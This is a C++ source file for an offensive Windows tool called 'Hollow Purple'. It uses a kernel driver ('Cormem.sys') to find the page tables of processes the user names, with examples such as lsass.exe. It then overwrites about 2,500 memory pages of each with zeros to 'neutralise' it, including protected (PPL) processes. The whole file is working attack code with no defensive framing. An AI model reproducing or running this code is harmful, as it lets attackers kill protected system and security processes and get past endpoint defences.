#include "Purple.hpp"
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <sstream>

DWORD GetProcessIdByName(const std::string& processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(processesSnapshot, &processInfo)) {
        do {
            if (!_stricmp(processInfo.szExeFile, processName.c_str())) {
                CloseHandle(processesSnapshot);
                return processInfo.th32ProcessID;
            }
        } while (Process32Next(processesSnapshot, &processInfo));
    }
    CloseHandle(processesSnapshot);
    return 0;
}

int main() {
    std::cout << "=========================================" << std::endl;
    std::cout << "      Hollow Purple (Cormem.sys)         " << std::endl;
    std::cout << "=========================================" << std::endl;

    // Initialisation du driver
    Purple drv;
    if (!drv.Initialize()) { std::cout << "[-] Echec initialisation driver." << std::endl; return 1; }

    uint64_t sysDTB = drv.FindSystemDTB();
    if (!sysDTB) { std::cout << "[-] Echec du System DTB." << std::endl; return 1; }

  
    std::cout << "\n[?] Entrez les targets separees par un espace (ex: notepad.exe lsass.exe) : ";
    std::string inputLine;
    std::getline(std::cin, inputLine);

    std::istringstream iss(inputLine);
    std::string processName;

    // Boucle de frappe
    while (iss >> processName) {
        std::cout << "\n-----------------------------------------" << std::endl;
        std::cout << "[*] Frappe sur : " << processName << std::endl;

        DWORD pid = GetProcessIdByName(processName);
        if (pid == 0) {
            std::cout << "[-] Processus introuvable, next." << std::endl;
            continue;
        }

        uint64_t baseAddress = 0;
        uint64_t targetDTB = drv.FindProcessDTB(pid, baseAddress);

        if (!targetDTB || !baseAddress) {
            std::cout << "[-] Echec de localisation PPL en RAM." << std::endl;
            continue;
        }

        std::cout << "[+] DTB: 0x" << std::hex << targetDTB << " | Base: 0x" << baseAddress << std::endl;

        // ecrasement du code du process
        uint8_t nuclearZeros[4096] = { 0 };
        int successCount = 0;

        for (int i = 0; i < 2500; i++) {
            if (drv.WriteProcessMemory(targetDTB, baseAddress + (i * 4096), nuclearZeros, sizeof(nuclearZeros))) {
                successCount++;
            }
        }

        std::cout << "[+] " << std::dec << successCount << " pages ecrasees. " << processName << " neutralise." << std::endl;
    }

    std::cout << "\n=========================================" << std::endl;
    std::cout << "[+] GOJOed." << std::endl;
    std::cout << "Appuyez sur Entree pour quitter." << std::endl;
    std::cin.get();
    return 0;
}